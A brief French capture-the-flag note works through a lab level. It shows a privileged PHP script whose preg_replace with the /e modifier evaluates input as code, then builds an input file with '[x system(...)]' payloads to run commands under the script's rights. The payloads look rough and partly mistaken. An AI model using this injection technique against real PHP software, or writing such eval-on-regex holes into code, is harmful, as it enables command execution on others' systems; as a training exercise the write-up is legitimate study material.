1. Ls dans le home, presence d'un script php et d'un executable qui l'appelle

ce script a les permission de flag05, donc on veut injecter "getflag > car/tmp/flag06" dedans

#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}

function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}

$r = x($argv[1], $argv[2]); 
print $r;
?>



echo "


[x system(system(echo hello > /var/tmp/flag))]


y("system(system(echo hello > /var/tmp/flag))")



" > /var/tmp/input.txt